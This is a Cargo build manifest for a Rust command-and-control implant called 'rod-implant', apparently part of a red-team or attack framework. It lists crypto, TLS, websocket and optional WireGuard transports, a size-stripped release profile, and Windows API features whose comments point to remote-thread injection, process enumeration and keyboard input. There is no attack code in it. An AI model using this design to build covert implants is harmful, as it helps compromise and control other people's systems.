[package]
name = "rod-implant"
version = "1.0.0-dev"
edition = "2021"

# The reference Rust implant (architecture.md Sec 12.2): the implant of
# record, covering what a managed runtime cannot -- 32-bit ARM musl IoT
# Linux, static musl, small-footprint servers -- at a native binary's size.
# Coupled to the teamserver only by the wire protocol (rod.proto) and the
# baked profile format, both language-neutral contracts.
#
# Like the retired .NET tree, this project is an EXTERNAL component: it is
# not part of Rod.slnx. The Rust build unit compiles it per build request.

[[bin]]
name = "rod-implant"
path = "src/main.rs"

[dependencies]
aes-gcm = "0.10"
base64 = "0.22"
boringtun = { version = "0.7", default-features = false, optional = true }
p256 = { version = "0.13", features = ["ecdsa"] }
prost = "0.13"
rand = "0.8"
rsa = { version = "0.9", features = ["sha2"] }
rustls = { version = "0.23", default-features = false, features = ["ring", "std"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
sha2 = "0.10"
tungstenite = { version = "0.26", default-features = false, features = ["handshake"] }
ureq = { version = "2", default-features = false, features = ["tls"] }
webpki-roots = "0.26"
x509-parser = { version = "0.16", default-features = false }

[features]
# The optional WireGuard transport (architecture.md Sec 8, Sec 15.3
# ADR-004 as amended): default off, enabled per build profile. The gate is
# the build contract's transport-enable set -- a profile that does not
# name wireguard compiles no tunnel code at all.
wireguard = ["dep:boringtun"]

[target.'cfg(unix)'.dependencies]
libc = "0.2"

[target.'cfg(windows)'.dependencies]
# Win32_Security looks source-unreferenced but is load-bearing: windows-sys
# emits CreateFileW and CreateRemoteThread only when the SECURITY_ATTRIBUTES
# their signatures carry is feature-present.
windows-sys = { version = "0.59", features = [
    "Win32_Foundation",
    "Win32_Security",
    "Win32_Storage_FileSystem",
    "Win32_System_Diagnostics_Debug",
    "Win32_System_Diagnostics_ToolHelp",
    "Win32_System_LibraryLoader",
    "Win32_System_Memory",
    "Win32_System_Threading",
    "Win32_UI_Input_KeyboardAndMouse",
] }

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true

[build-dependencies]
prost-build = "0.13"
